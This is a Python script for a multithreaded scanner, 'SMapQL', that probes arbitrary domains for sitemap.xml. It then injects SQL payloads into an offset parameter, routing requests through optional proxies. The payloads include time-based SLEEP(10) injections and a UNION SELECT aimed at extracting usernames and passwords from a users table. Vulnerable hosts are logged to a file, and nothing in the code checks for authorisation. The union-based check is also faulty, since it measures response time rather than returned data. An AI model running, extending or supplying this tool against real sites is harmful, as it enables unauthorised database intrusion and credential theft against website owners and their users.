import argparse
import logging
import requests
import time
from bs4 import BeautifulSoup
from queue import Queue
from threading import Thread

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class SitemapSQLiTool:
    def __init__(self, target_domains, thread_count, rate_limit_delay=1, proxies=None):
        self.target_domains = target_domains
        self.thread_count = thread_count
        self.rate_limit_delay = rate_limit_delay
        self.proxies = proxies
        self.sitemap_subdomains = []
        self.vulnerable_domains = []
        self.queue = Queue()

    def find_sitemaps(self):
        def worker():
            while not self.queue.empty():
                domain = self.queue.get()
                try:
                    response = requests.get(f"https://{domain}/sitemap.xml", proxies=self.proxies)
                    if response.status_code == 200:
                        self.sitemap_subdomains.append(domain)
                except requests.exceptions.RequestException as e:
                    logger.error(f"An error occurred: {e}")
                self.queue.task_done()
                time.sleep(self.rate_limit_delay)

        for domain in self.target_domains:
            self.queue.put(domain)

        for _ in range(self.thread_count):
            thread = Thread(target=worker)
            thread.start()

        self.queue.join()

        logger.info(f"Found {len(self.sitemap_subdomains)} domains with sitemaps.")

    def test_sqli(self):
        def worker():
            while not self.queue.empty():
                domain = self.queue.get()
                try:
                    response = requests.get(
                        f"https://{domain}/sitemap.xml?offset=1;SELECT IF((8303>8302),SLEEP(10),2356)#",
                        timeout=20,
                        proxies=self.proxies
                    )
                    if response.elapsed.total_seconds() > 10:
                        self.vulnerable_domains.append(domain)
                except requests.exceptions.RequestException as e:
                    logger.error(f"An error occurred: {e}")
                self.queue.task_done()
                time.sleep(self.rate_limit_delay)

        for domain in self.sitemap_subdomains:
            self.queue.put(domain)

        for _ in range(self.thread_count):
            thread = Thread(target=worker)
            thread.start()

        self.queue.join()

        logger.info(f"Found {len(self.vulnerable_domains)} vulnerable domains.")

    def test_sqli_error_based(self):
        def worker():
            while not self.queue.empty():
                domain = self.queue.get()
                try:
                    # Modify the payload and URL according to your error-based SQLi testing approach
                    payload = "1' AND 1=IF(1=1, SLEEP(10), 0) -- "
                    url = f"https://{domain}/sitemap.xml?offset={payload}"
                    response = requests.get(url, timeout=20, proxies=self.proxies)
                    if response.elapsed.total_seconds() > 10:
                        self.vulnerable_domains.append(domain)
                except requests.exceptions.RequestException as e:
                    logger.error(f"An error occurred: {e}")
                self.queue.task_done()
                time.sleep(self.rate_limit_delay)

        for domain in self.sitemap_subdomains:
            self.queue.put(domain)

        for _ in range(self.thread_count):
            thread = Thread(target=worker)
            thread.start()

        self.queue.join()

        logger.info(f"Found {len(self.vulnerable_domains)} vulnerable domains.")

    def test_sqli_union_based(self):
        def worker():
            while not self.queue.empty():
                domain = self.queue.get()
                try:
                    # Modify the payload and URL according to your union-based SQLi testing approach
                                        payload = "' UNION SELECT username, password, NULL FROM users -- "
                    url = f"https://{domain}/sitemap.xml?offset={payload}"
                    response = requests.get(url, timeout=20, proxies=self.proxies)
                    if response.elapsed.total_seconds() > 10:
                        self.vulnerable_domains.append(domain)
                except requests.exceptions.RequestException as e:
                    logger.error(f"An error occurred: {e}")
                self.queue.task_done()
                time.sleep(self.rate_limit_delay)

        for domain in self.sitemap_subdomains:
            self.queue.put(domain)

        for _ in range(self.thread_count):
            thread = Thread(target=worker)
            thread.start()

        self.queue.join()

        logger.info(f"Found {len(self.vulnerable_domains)} vulnerable domains.")

    def parse_sitemap(self, domain):
        # Implement sitemap parsing here...
        pass

    def report(self, output_file="vulnerable_domains.txt"):
        # Implement different reporting options (e.g., CSV, JSON, XML)
        # based on user preferences or provide a default output file name.
        with open(output_file, "w") as f:
            for domain in self.vulnerable_domains:
                f.write(f"{domain}\n")
        logger.info("Vulnerabilities reported.")


def parse_arguments():
    parser = argparse.ArgumentParser(description="SMapQL - Advanced Sitemap SQLi Tool")
    parser.add_argument("target_domains", type=str, nargs="+", help="List of target domains.")
    parser.add_argument("-t", "--threads", type=int, default=10, help="Number of threads to use.")
    parser.add_argument("-d", "--delay", type=float, default=1.0, help="Rate limit delay between requests.")
    parser.add_argument("-p", "--proxies", type=str, help="Proxy server address (e.g., 'http://proxy:port').")
    parser.add_argument("-o", "--output", type=str, default="vulnerable_domains.txt", help="Output file name.")
    return parser.parse_args()


if __name__ == "__main__":
    args = parse_arguments()
    proxies = {"http": args.proxies, "https": args.proxies} if args.proxies else None
    tool = SitemapSQLiTool(args.target_domains, args.threads, args.delay, proxies)
    tool.find_sitemaps()
    tool.test_sqli()
    tool.test_sqli_error_based()
    tool.test_sqli_union_based()
    tool.report(args.output)

